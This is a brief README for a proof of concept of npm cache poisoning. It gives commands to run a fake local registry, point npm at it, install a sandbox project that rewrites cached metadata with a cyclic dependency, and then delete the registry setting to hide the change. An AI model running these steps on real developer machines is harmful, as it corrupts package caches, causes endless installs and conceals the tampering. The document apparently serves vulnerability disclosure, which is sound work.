# POC of npm cache poison

* start fake registry
```bash
cd server
npm start
```
* set npm to use this registry
```bash
npm config set registry http://localhost:6790
```
* run sandbox install(this command will drop cache to rewrite it with wrong metadata)
```bash
cd sandbox
npm start
```
**NOTE** this project has cyclic dependency(install will never end) drop this process after 20 sec
* hide registry rewrite
```bash
npm config delete registry
```
* you cache has invalid metadata if you will try install modules from sandbox malware meta will cause infinite install
